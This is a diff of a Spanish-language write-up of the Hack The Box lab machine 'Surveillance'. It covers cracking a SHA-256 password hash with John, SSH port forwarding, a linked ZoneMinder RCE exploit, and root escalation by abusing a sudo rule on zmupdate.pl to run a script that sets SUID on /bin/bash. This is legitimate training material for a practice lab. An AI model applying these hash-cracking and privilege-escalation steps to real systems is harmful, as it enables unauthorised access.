@@ -134,7 +134,7 @@ _Craft CMS CVE_
 
 ## Explotación
 
-Luego buscando por el CVE correspondiente encontré un [POC](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce) el cual contiene un script en Python para la explotación de la vulnerabilidad, sin embargo, yo realicé algunas modificaciones.
+Luego buscando por el CVE correspondiente encontré un [POC](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce) el cual contiene un script en Python para la explotación de la vulnerabilidad, sin embargo, yo realicé algunas modificaciones escribiendolo desde cero para comprender todo lo que pasa por detrás.
 
 Pero antes de continuar con el script, voy a explicar la manera de como entendí cómo sucede todo por detrás, porque soy un curioso y la curiosidad mato al ...
 
@@ -274,3 +274,117 @@ Ya que es un archivo muy grande al descomprimirlo, lo que haré será grepear po
 
 ![CommandGrep]({{ 'assets/img/commons/Surveillance/database.png' | relative_url }}){: .center-image }
 _Grep DataBase File_
+
+Ahora lo que haré será ver qué tipo de hash es mediante **hash-identifier**
+
+
+![IdentifyHash]({{ 'assets/img/commons/Surveillance/hash.png' | relative_url }}){: .center-image }
+_Identify hash_
+
+Ya que el hash es **sha256** lo crackearé con John utilizando el **rockyou.txt**. Luego ingresaré por SSH utilizando la contraseña del usuario **matthew**
+
+```bash
+❯ echo -n "39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec" > hash
+❯ john -w=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA256
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=8
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+starcraft1  (?)
+1g 0:00:00:00 DONE (2023-12-17 20:39) 5.882g/s 21588Kp/s 21588Kc/s 21588KC/s stefon23..sn283437
+Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
+Session completed.
+```
+
+## User Pivoting
+
+Veo los puertos internos abiertos y veo el **8080** el cual contiene una página
+
+
+```bash
+matthew@surveillance:~$ ss -nltp
+State          Recv-Q         Send-Q                 Local Address:Port                 Peer Address:Port        Process
+LISTEN         0              80                         127.0.0.1:3306                      0.0.0.0:*
+LISTEN         0              511                        127.0.0.1:8080                      0.0.0.0:*
+LISTEN         0              511                          0.0.0.0:80                        0.0.0.0:*
+LISTEN         0              4096                   127.0.0.53%lo:53                        0.0.0.0:*
+LISTEN         0              128                          0.0.0.0:22                        0.0.0.0:*
+LISTEN         0              128                             [::]:22                           [::]:*
+```
+
+Lo que haré será a través de ssh realizar un forward para que el puerto **8080** de la máquina víctima sea mi puerto **8080** local
+
+```bash
+❯ ssh matthew@10.10.11.245 -L 8080:127.0.0.1:8080
+```
+
+Luego vi la Web y utilizaban **Zoneminder**, un software para **CCTV**, busqué vulnerabilidades para ese software y encontré un [RCE](https://github.com/rvizx/CVE-2023-26035) sin estar autenticados junto a un exploit. En este caso se abusa del **csrftoken** hardcodeado en el código del servidor y junto a ciertos parámetros (incluyendo el csrftoken) se logra la ejecución. Ahora somos el usuario **ZoneMinder**
+
+## Privesc
+
+Haciendo un **sudo -l** para ver qué permisos de Sudoers tiene el usuario veo lo siguiente
+
+```bash
+zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
+Matching Defaults entries for zoneminder on surveillance:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User zoneminder may run the following commands on surveillance:
+    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
+zoneminder@surveillance:/usr/share/zoneminder/www$
+```
+
+Hago un grepeo utilizando la misma expresión regular que hay en los permisos de sudoers, para ver qué archivos hay que tengan esa estructura
+
+```bash
+zoneminder@surveillance:/usr/bin$ ls | grep -oP '^zm[a-zA-Z]+\.pl$' | xargs ls -la
+-rwxr-xr-x 1 root root 43027 Nov 23  2022 zmaudit.pl
+-rwxr-xr-x 1 root root 12939 Nov 23  2022 zmcamtool.pl
+-rwxr-xr-x 1 root root  6043 Nov 23  2022 zmcontrol.pl
+-rwxr-xr-x 1 root root 26232 Nov 23  2022 zmdc.pl
+-rwxr-xr-x 1 root root 35206 Nov 23  2022 zmfilter.pl
+-rwxr-xr-x 1 root root 13994 Nov 23  2022 zmpkg.pl
+-rwxr-xr-x 1 root root 17492 Nov 23  2022 zmrecover.pl
+-rwxr-xr-x 1 root root  4815 Nov 23  2022 zmstats.pl
+-rwxr-xr-x 1 root root  2133 Nov 23  2022 zmsystemctl.pl
+-rwxr-xr-x 1 root root 13111 Nov 23  2022 zmtelemetry.pl
+-rwxr-xr-x 1 root root  5340 Nov 23  2022 zmtrack.pl
+-rwxr-xr-x 1 root root 18482 Nov 23  2022 zmtrigger.pl
+-rwxr-xr-x 1 root root 45421 Nov 23  2022 zmupdate.pl
+-rwxr-xr-x 1 root root  8205 Nov 23  2022 zmvideo.pl
+-rwxr-xr-x 1 root root  7022 Nov 23  2022 zmwatch.pl
+```
+
+Veo que hay distintos archivos. Hay uno que me llama la atención y es **zmupdate**, analizando un poco la manera en la que se ejecuta veo que es para actualizar la base de datos de **zoneminder**, para ello me pide las credenciales de la base de datos de dicho software, entonces lo que haré será buscar en el sistema dónde está el archivo de configuración de la base de datos.
+
+Descubro que la ruta donde se almacena la Web es en **/usr/share/zoneminder** con el comando **find / -group zoneminder 2>/dev/null**
+
+Yendome a la ruta veo el **www**, entro ahí y ejecuto lo siguiente para buscar de manera recursiva por la palabra "password" en todos los archivos bajo el directorio actual de trabajo:
+
+```bash
+zoneminder@surveillance:/usr/share/zoneminder/www$ grep -r "password"
+```
+
+Y sopresa!. Encontré la contraseña de la base de datos de **Zoneminder**
+
+
+![PasswordDB]({{ 'assets/img/commons/Surveillance/passdatabase.png' | relative_url }}){: .center-image }
+_Password DB_
+
+
+Ahora sí, podemos proceder a la explotación del script escrito en **perl**. Lo que haré será actualizar la versión de la base de datos a la **1** (está en la versión 1.36.32, es decir la estamos degradando) para efectuar la actualización, ya que el script lo que se supone que hace es actualizar algo en la base de datos. Luego a nivel de usuario metemos lo que queremos ejecutar, en mi caso crearé un archivo en **/dev/shm** (Una ruta temporal del sistema que de ella poco se habla eh!) el cual será **test.sh**, con el siguiente contenido:
+
+```bash
+#!/bin/bash
+chmod u+s /bin/bash
+```
+
+Lo que haré será asignarle el permiso SUID a la bash, luego ejecuto el script con los siguientes parámetros (Luego de realizar algunas pruebas descubrí que realmente no necesitas la contraseña de la base de datos, pero bueno, al menos ya sabes cómo buscar con grep xd)
+
+
+![Privesc]({{ 'assets/img/commons/Surveillance/privesc.png' | relative_url }}){: .center-image }
+_Privesc_
+
+Y listo! obtenemos root, espero te haya gustado el Writeup y si quieres dejame el respect de HTB adjunto acá mismo en mi blog. Si quieres comentarme algo escribeme a mi Twitter al DM. Hasta el próximo Writeup!!
